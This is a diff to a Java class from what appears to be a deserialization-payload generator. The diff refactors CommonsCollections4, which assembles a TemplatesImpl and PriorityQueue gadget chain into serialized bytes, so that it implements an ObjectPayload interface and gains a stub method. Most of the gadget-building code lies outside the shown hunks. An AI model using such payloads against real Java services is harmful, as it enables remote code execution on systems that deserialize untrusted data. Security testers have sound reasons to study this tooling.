@@ -14,10 +14,15 @@ import javax.xml.transform.Templates;
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
 import java.util.PriorityQueue;
+import java.util.Queue;
 
-public class CommonsCollections4 {
+/**
+ * Variation on CommonsCollections2 that uses InstantiateTransformer instead of
+ * InvokerTransformer.
+ */
+public class CommonsCollections4 implements ObjectPayload<Queue<Object>>{
 
-    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
         Object templates = Gadgets.createTemplatesImpl(type, param);
 
         ConstantTransformer constant = new ConstantTransformer(String.class);
@@ -52,5 +57,10 @@ public class CommonsCollections4 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Queue<Object> getObject(String command) throws Exception {
+        return null;
     }
 }
